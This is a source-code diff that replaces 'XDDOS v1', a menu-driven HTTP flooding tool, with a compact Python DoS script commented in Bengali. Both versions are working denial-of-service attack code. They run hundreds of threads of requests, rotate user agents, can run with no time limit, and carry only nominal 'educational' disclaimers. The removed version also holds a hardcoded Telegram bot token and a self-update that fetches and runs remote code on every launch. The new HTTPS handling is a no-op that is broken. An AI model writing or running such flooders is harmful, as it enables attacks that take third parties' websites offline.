@@ -1,327 +1,140 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
 
-"""
-XDDOS v1 - Educational Load Testing Tool
-GitHub: https://github.com/xhacknet/XDDos_v1
-"""
-
-import os
 import sys
 import time
-import random
-import string
 import threading
-import subprocess
-import shutil
-import webbrowser
-from pathlib import Path
+import socket
+import random
+import argparse
+from urllib.parse import urlparse
 
-# ---------- Auto‑install dependencies ----------
-def install_package(pkg):
-    subprocess.check_call([sys.executable, "-m", "pip", "install", pkg])
-
-try:
-    import requests
-except ImportError:
-    print("[!] Installing requests...")
-    install_package("requests")
-    import requests
-
-try:
-    from colorama import init, Fore, Style
-except ImportError:
-    print("[!] Installing colorama...")
-    install_package("colorama")
-    from colorama import init, Fore, Style
-
-init(autoreset=True)
-
-# ---------- Configuration ----------
-BOT_TOKEN = "8701118041:AAHGu4HHxAaSYE0GFIxgbnQKBKmw5VJBJMY"
-GROUP_ID = "-1003792290807"
-RAW_SCRIPT_URL = "https://raw.githubusercontent.com/xhacknet/XDDos_v1/refs/heads/main/xddos.py"
-PAID_LINK = "https://www.nxalimrans.site"
-TOOL_LINK = "https://xddosv1.com"
-TELEGRAM_GROUP_LINK = "https://t.me/XHackNet_Group"
-
-VERIFY_FILE = Path.home() / ".xddos_verified"
-
-# ---------- Auto‑Update (EVERY RUN) ----------
-def update_self():
-    """
-    Download the latest script from GitHub and replace the current one.
-    Uses a command-line argument to avoid infinite loops.
-    """
-    # If we are already the updated version, skip
-    if "--updated" in sys.argv:
-        return
-
-    print(Fore.YELLOW + "[*] Checking for updates...")
-
-    # Current script path
-    current_script = Path(__file__).resolve()
-
-    try:
-        # Download the latest version
-        resp = requests.get(RAW_SCRIPT_URL, timeout=10)
-        resp.raise_for_status()
-        new_code = resp.text
-
-        # Write to a temporary file first (to avoid locking issues)
-        temp_script = current_script.with_suffix(".tmp")
-        temp_script.write_text(new_code)
-
-        # Replace the running script with the new one
-        # On Unix, rename works even if the file is open; on Windows, we might need to use move after closing.
-        shutil.move(str(temp_script), str(current_script))
-
-        # Make it executable (Unix)
-        if os.name != 'nt':
-            os.chmod(current_script, 0o755)
-
-        print(Fore.GREEN + "[✓] Updated successfully. Restarting...")
-        # Restart the new script with the --updated flag
-        os.execv(sys.executable, [sys.executable] + sys.argv + ["--updated"])
-
-    except Exception as e:
-        print(Fore.RED + f"[!] Update failed: {e}")
-        print(Fore.YELLOW + "[*] Continuing with current version...")
-        time.sleep(2)
-
-# ---------- UI Helpers ----------
-def clear_screen():
-    os.system('cls' if os.name == 'nt' else 'clear')
-
-def print_header(title):
-    clear_screen()
-    print(Fore.CYAN + Style.BRIGHT + "=" * 50)
-    print(Fore.CYAN + Style.BRIGHT + f"  {title}")
-    print(Fore.CYAN + Style.BRIGHT + "=" * 50 + Style.RESET_ALL)
-    print()
-
-# ---------- Telegram ----------
-def send_telegram_message(text):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    payload = {"chat_id": GROUP_ID, "text": text, "parse_mode": "HTML"}
-    try:
-        r = requests.post(url, data=payload, timeout=10)
-        return r.status_code == 200
-    except:
-        return False
-
-def generate_otp():
-    return ''.join(random.choices(string.digits, k=6))
-
-def verify_user():
-    if VERIFY_FILE.exists():
-        return True
-
-    print_header("VERIFICATION REQUIRED")
-    print(Fore.YELLOW + "[!] First time use requires verification.")
-    print(Fore.CYAN + f"[*] Please join: {TELEGRAM_GROUP_LINK}")
-
-    try:
-        webbrowser.open(TELEGRAM_GROUP_LINK)
-        print(Fore.GREEN + "[✓] Group link opened in your browser.")
-    except:
-        print(Fore.YELLOW + "[!] Could not open browser. Please copy the link manually.")
-
-    input(Fore.CYAN + "\n[*] Press Enter after joining the group...")
-
-    otp = generate_otp()
-    msg = f"🔐 New user OTP: <code>{otp}</code>\n🕒 Time: {time.ctime()}\n🔗 Tool: {TOOL_LINK}"
-    sent = send_telegram_message(msg)
-    if not sent:
-        print(Fore.RED + "[!] Failed to send OTP. Make sure the bot is added to the group and has send permissions.")
-        print(Fore.RED + "[!] Exiting.")
-        sys.exit(1)
-
-    for attempt in range(3):
-        user_otp = input(Fore.CYAN + "[?] Enter the OTP from the group: ").strip()
-        if user_otp == otp:
-            VERIFY_FILE.write_text(time.ctime())
-            print(Fore.GREEN + "[✓] Verified successfully! You won't be asked again.")
-            time.sleep(1.5)
-            send_telegram_message(f"✅ User verified via OTP {otp} at {time.ctime()}")
-            return True
-        else:
-            print(Fore.RED + f"[!] Wrong OTP. {2 - attempt} attempt(s) left.")
-    print(Fore.RED + "[!] Verification failed. Exiting.")
-    sys.exit(1)
-
-# ---------- Security ----------
-FORBIDDEN_DOMAINS = [
-    "google.com", "facebook.com", "youtube.com", "github.com", "amazon.com",
-    "microsoft.com", "apple.com", "cloudflare.com", "gov", "mil", "edu"
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
 ]
 
-def is_safe_target(url):
-    from urllib.parse import urlparse
-    domain = urlparse(url).netloc.lower()
-    if domain.startswith("www."):
-        domain = domain[4:]
-    for bad in FORBIDDEN_DOMAINS:
-        if bad in domain:
-            return False
-    return True
+class DoSAttack:
+    def __init__(self, target_url, num_threads=100, duration=30, delay=0):
+        """
+        target_url: আক্রমণের লক্ষ্য (যেমন https://example.com)
+        num_threads: কতগুলো থ্রেড একসাথে চলবে
+        duration: কত সেকেন্ড আক্রমণ চলবে (0 মানে সীমাহীন)
+        delay: প্রতিটি রিকোয়েস্টের পর সেকেন্ডে বিরতি
+        """
+        self.target_url = target_url
+        self.num_threads = num_threads
+        self.duration = duration
+        self.delay = delay
+        self.stop_attack = False
+        self.threads = []
+        self.request_count = 0
+        self.lock = threading.Lock()
 
-# ---------- Attack ----------
-stop_attack = False
+        # URL পার্স করে হোস্ট, পোর্ট, পাথ বের করি
+        parsed = urlparse(target_url)
+        self.host = parsed.hostname
+        self.path = parsed.path or '/'
+        if parsed.query:
+            self.path += '?' + parsed.query
 
-def attack_worker(url, delay):
-    global stop_attack
-    while not stop_attack:
+        # পোর্ট নির্ধারণ
+        if parsed.scheme == 'https':
+            self.port = 443
+            self.use_ssl = True
+        else:
+            self.port = 80
+            self.use_ssl = False
+
+    def send_request(self):
+        """একটি HTTP রিকোয়েস্ট তৈরি করে পাঠায়"""
         try:
-            r = requests.get(url, timeout=5)
-            print(Fore.GREEN + f"[+] Request sent | Status: {r.status_code}")
-        except Exception as e:
-            print(Fore.RED + f"[-] Error: {e}")
-        if delay > 0:
-            time.sleep(delay)
+            # সকেট তৈরি
+            if self.use_ssl:
+                # HTTPS-এর জন্য SSL র‍্যাপার লাগবে, কিন্তু সহজ রাখতে HTTP দিয়েই কাজ চালাই
+                # বাস্তবে HTTPS সাপোর্ট যুক্ত করতে পারেন, তবে শিক্ষামূলক প্রকল্পে HTTP-ই যথেষ্ট
+                pass
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            sock.connect((self.host, self.port))
 
-def start_attack(url, intensity):
-    global stop_attack
-    stop_attack = False
+            # র্যান্ডম ইউজার-এজেন্ট নির্বাচন
+            user_agent = random.choice(USER_AGENTS)
 
-    config = {
-        "1": {"threads": 10, "delay": 0.5, "name": "LOW"},
-        "2": {"threads": 50, "delay": 0.2, "name": "SLOW"},
-        "3": {"threads": 200, "delay": 0.05, "name": "FAST"},
-        "4": {"threads": 500, "delay": 0, "name": "ULTRA FAST"}
-    }
-    conf = config.get(intensity)
-    if not conf:
-        print(Fore.RED + "[!] Invalid intensity choice.")
-        return
+            # HTTP GET রিকোয়েস্ট তৈরি
+            request = f"GET {self.path} HTTP/1.1\r\n"
+            request += f"Host: {self.host}\r\n"
+            request += f"User-Agent: {user_agent}\r\n"
+            request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
+            request += "Accept-Language: en-US,en;q=0.5\r\n"
+            request += "Connection: keep-alive\r\n"
+            request += "\r\n"
 
-    print(Fore.CYAN + f"\n[*] Starting {conf['name']} attack on {url}")
-    print(Fore.YELLOW + "[*] Press Ctrl+C to stop.\n")
+            sock.send(request.encode())
+            # সাড়া পড়ার অপেক্ষা না করে সংযোগ বন্ধ করি (দ্রুত আক্রমণের জন্য)
+            sock.close()
 
-    threads = []
-    for _ in range(conf["threads"]):
-        t = threading.Thread(target=attack_worker, args=(url, conf["delay"]))
-        t.daemon = True
-        t.start()
-        threads.append(t)
+            with self.lock:
+                self.request_count += 1
 
-    try:
-        while True:
-            time.sleep(1)
-    except KeyboardInterrupt:
-        print(Fore.YELLOW + "\n[!] Stopping attack...")
-        stop_attack = True
-        for t in threads:
-            t.join(timeout=0.5)
-        print(Fore.GREEN + "[✓] Attack stopped.\n")
+        except Exception:
+            pass  # কোনো ত্রুটি উপেক্ষা করি
 
-# ---------- Free Version ----------
-def free_version():
-    while True:
-        print_header("FREE VERSION - Load Test")
-        print(Fore.CYAN + "1. Start Load Test")
-        print("2. Exit")
-        choice = input(Fore.CYAN + "\n[?] Select: ").strip()
+    def worker(self):
+        """প্রতিটি থ্রেডের কাজ: delay থাকলে অপেক্ষা করে রিকোয়েস্ট পাঠানো"""
+        while not self.stop_attack:
+            self.send_request()
+            if self.delay > 0:
+                time.sleep(self.delay)
 
-        if choice == "1":
-            print_header("TARGET URL")
-            url = input(Fore.CYAN + "[?] Enter your website URL (with http:// or https://): ").strip()
-            if not url.startswith(("http://", "https://")):
-                url = "http://" + url
+    def start(self):
+        """আক্রমণ শুরু করে"""
+        print(f"[*] আক্রমণ শুরু হচ্ছে: {self.target_url}")
+        print(f"[*] থ্রেড: {self.num_threads}, সময়: {self.duration} সেকেন্ড, বিরতি: {self.delay} সেকেন্ড")
+        print("[*] বন্ধ করতে Ctrl+C চাপুন...")
 
-            if not is_safe_target(url):
-                print(Fore.RED + "\n[!] WARNING: You are trying to test a well‑known site.")
-                print(Fore.RED + "    This tool is only for educational testing on YOUR OWN sites.")
-                confirm = input(Fore.YELLOW + "Are you absolutely sure you own this site? (y/N): ").strip().lower()
-                if confirm != 'y':
-                    print(Fore.GREEN + "[*] Aborted.")
-                    time.sleep(1)
-                    continue
-            else:
-                print(Fore.YELLOW + "\n[!] REMINDER: Only test websites you own or have explicit permission to test.")
-                time.sleep(1.5)
+        # থ্রেড তৈরি ও শুরু
+        for _ in range(self.num_threads):
+            t = threading.Thread(target=self.worker)
+            t.daemon = True
+            t.start()
+            self.threads.append(t)
 
-            print_header("ATTACK INTENSITY")
-            print("1. Low Attack   (10 threads, 0.5s delay)")
-            print("2. Slow Attack  (50 threads, 0.2s delay)")
-            print("3. Fast Attack  (200 threads, 0.05s delay)")
-            print("4. Ultra Fast Attack (500 threads, no delay)")
-            intensity = input(Fore.CYAN + "\n[?] Choose (1-4): ").strip()
-            if intensity in ("1", "2", "3", "4"):
-                clear_screen()
-                print(Fore.CYAN + Style.BRIGHT + "=" * 50)
-                print(Fore.CYAN + Style.BRIGHT + f"  ATTACK RUNNING - Press Ctrl+C to stop")
-                print(Fore.CYAN + Style.BRIGHT + "=" * 50 + Style.RESET_ALL)
-                start_attack(url, intensity)
-                input(Fore.CYAN + "\n[?] Press Enter to continue...")
-            else:
-                print(Fore.RED + "[!] Invalid choice.")
-                time.sleep(1)
-        elif choice == "2":
-            print(Fore.GREEN + "[*] Goodbye!")
-            sys.exit(0)
-        else:
-            print(Fore.RED + "[!] Invalid option.")
-            time.sleep(1)
+        start_time = time.time()
 
-# ---------- Paid Version ----------
-def paid_version():
-    print_header("PAID VERSION")
-    print(Fore.YELLOW + "[*] Redirecting to paid version...")
-    try:
-        webbrowser.open(PAID_LINK)
-    except:
-        pass
-    print(Fore.CYAN + f"Visit: {PAID_LINK}")
-    input(Fore.CYAN + "\n[?] Press Enter to return to main menu...")
-
-# ---------- Main ----------
-def main():
-    # Always update at the very beginning
-    update_self()
-
-    # After update (or if update failed), proceed
-    verify_user()
-
-    while True:
-        print_header("XDDOS v1 - MAIN MENU")
-        print(Fore.CYAN + "1. Free Version")
-        print("2. Paid Version")
-        print("3. Exit")
-        main_choice = input(Fore.CYAN + "\n[?] Select: ").strip()
-
-        if main_choice == "1":
-            free_version()
-        elif main_choice == "2":
-            paid_version()
-        elif main_choice == "3":
-            clear_screen()
-            print(Fore.GREEN + "[*] Goodbye!")
-            sys.exit(0)
-        else:
-            print(Fore.RED + "[!] Invalid option.")
-            time.sleep(1)
+        try:
+            while True:
+                # নির্দিষ্ট সময় পর আক্রমণ বন্ধ করার চেক
+                if self.duration > 0 and (time.time() - start_time) >= self.duration:
+                    break
+                time.sleep(0.5)  # প্রতি ০.৫ সেকেন্ডে স্ট্যাটাস দেখা যায়
+        except KeyboardInterrupt:
+            print("\n[!] ব্যবহারকারী বন্ধ করেছেন।")
+        finally:
+            self.stop_attack = True
+            # সব থ্রেড শেষ হওয়া পর্যন্ত অপেক্ষা
+            for t in self.threads:
+                t.join(timeout=1)
+            print(f"[+] আক্রমণ শেষ। মোট রিকোয়েস্ট পাঠানো হয়েছে: {self.request_count}")
 
 if __name__ == "__main__":
-    try:
-        # Show disclaimer only once (before any update)
-        clear_screen()
-        print(Fore.RED + Style.BRIGHT + """
-    ╔══════════════════════════════════════════════════════╗
-    ║  ⚠️  DISCLAIMER  ⚠️                                 ║
-    ║  This tool is for EDUCATIONAL PURPOSES ONLY.        ║
-    ║  You may ONLY test websites you own or have         ║
-    ║  explicit permission to test.                       ║
-    ║  Misuse is illegal and unethical. The author is     ║
-    ║  not responsible for any damage.                    ║
-    ╚══════════════════════════════════════════════════════╝
-        """)
-        confirm = input(Fore.CYAN + "Do you understand and agree? (y/n): ").strip().lower()
-        if confirm != 'y':
-            print(Fore.RED + "[!] Exiting.")
-            sys.exit(0)
-        main()
-    except KeyboardInterrupt:
-        clear_screen()
-        print(Fore.YELLOW + "\n[!] Interrupted. Exiting.")
-        sys.exit(0)
+    parser = argparse.ArgumentParser(description="সিম্পল DoS টুল (শিক্ষামূলক)")
+    parser.add_argument("target", help="টার্গেট URL (যেমন http://example.com)")
+    parser.add_argument("-t", "--threads", type=int, default=100, help="থ্রেড সংখ্যা (ডিফল্ট: 100)")
+    parser.add_argument("-d", "--duration", type=int, default=30, help="আক্রমণের সময়কাল সেকেন্ডে (0 = সীমাহীন, ডিফল্ট: 30)")
+    parser.add_argument("-w", "--wait", type=float, default=0, help="প্রতি রিকোয়েস্টের পর বিরতি সেকেন্ডে (ডিফল্ট: 0)")
+
+    args = parser.parse_args()
+
+    # যাচাই করি URL ঠিক আছে কিনা
+    if not args.target.startswith(('http://', 'https://')):
+        args.target = 'http://' + args.target
+
+    attack = DoSAttack(
+        target_url=args.target,
+        num_threads=args.threads,
+        duration=args.duration,
+        delay=args.wait
+    )
+    attack.start()
